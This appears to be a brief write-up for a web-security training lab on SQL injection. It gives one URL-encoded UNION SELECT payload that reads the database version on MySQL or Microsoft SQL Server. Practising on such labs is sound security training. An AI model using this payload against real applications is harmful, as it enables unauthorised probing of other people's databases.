# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Objective
Perform the attack to solve SQL injection attack, querying the database type and version on MySQL and Microsoft.

## Payload
```text
'+UNION+SELECT+@@version,+NULL#
```
